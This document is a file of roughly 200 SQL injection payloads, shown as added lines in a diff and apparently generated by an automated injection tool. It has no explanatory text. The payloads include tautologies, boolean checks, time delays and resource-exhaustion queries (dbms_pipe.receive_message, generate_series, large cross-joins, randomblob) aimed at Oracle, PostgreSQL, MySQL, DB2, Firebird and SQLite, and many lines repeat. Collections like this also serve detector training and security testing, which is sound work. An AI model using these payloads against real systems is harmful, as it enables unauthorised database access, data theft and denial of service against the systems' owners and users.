@@ -1,0 +1,200 @@
+1 where 6077  =  6077 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #
+1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph
+select * from users where id  =  1 <@$_ or 1  =  1 -- 1
+-7758%'   )    )     )   or 3038  =  3038
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl
+1%"   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'
+1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686
+1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh
+1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl
+select * from users where id  =  1 <@$_ or 1  =  1 -- 1
+-5840'  )   or elt  (  1032  =  1032,3623  )  
+1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +'
+1"  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'
+1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #
+-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) 
+1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  "%"  =  "
+1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw
+1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+select * from users where id  =  1 <@$_ or 1  =  1 -- 1
+1"   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683
+1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '
+1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  
+1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'
+-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #
+1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  
+1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh
+1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --
+1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+select * from users where id  =  1.<@$ or 1  =  1 -- 1
+select * from users where id  =  1.<@$ or 1  =  1 -- 1
+1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #
+1" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #
+1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw
+1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --
+1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240
+1"   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  "gimc" like "gimc
+1%'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  '
+1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164
+1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+-6123" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and "zuzx"  =  "zuzx
+1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --
+1"  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  "vudj" like "vudj
+1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '
+1"  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  "kxws" like "kxws
+select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  "%"  =  "
+1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd
+ select * from users where id  =  1 or "{  )  " or 1  =  1 -- 1
+select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240
+1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468
+-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569
+1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl
+1"  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --
+1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh
+1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'
+1%" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  "
+select * from users where id  =  1.<@$ or 1  =  1 -- 1
+-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih
+1'+  (  select 'jhce' where 1117  =  1117 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'
+-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) 
+1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --
+-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569
+1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+-8673"  )   or make_set  (  9354  =  9354,7185  )   and   (  "edap" like "edap
+-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih
+select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou
+1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh
+-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih
+select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo
+1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||'
+1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '
+1 where 6077  =  6077 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1"   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  "czvm" like "czvm
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1"   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  "jzzu"  =  "jzzu
+1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #
+select * from users where id  =  1 <@$_ or 1  =  1 -- 1
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #
+1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164
+-5840'  )   or elt  (  1032  =  1032,3623  )  
+1%'   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd
+1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '
+1"   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%"  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  "%"  =  "
+1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164
+1"  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  "kxws" like "kxws
+1   )    )    as aeat where 1007  =  1007 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  "dskh"  =  "dskh
+-2583"  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --
+1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa
+select count  (  *  )   from generate_series  (  1,5000000  )   and   (  "kngx" like "kngx
+1"   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '
+1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'
+1%"   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1"   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  
+-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl
+-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --
+1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+-7793"   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  "lias"  =  "lias
+call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   "eevk"  =  "eevk
+-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and "%"  =  "
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz
+select * from users where id  =  1 <@$_ or 1  =  1 -- 1
+1"   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  "%"  =  "
+-1989%'   )    )    or 6179  =  8518#
+1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+1"   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --
+select * from users where id  =  1.<@$ or 1  =  1 -- 1
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #
+1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo
+1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'
+1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'
+1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507
+-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --
+-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu
+1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw
+-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164
+1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl
+1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686
+1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  
+1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #
+1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||'
+1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--
+select * from users where id  =  1.<@$ or 1  =  1 -- 1
+1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--
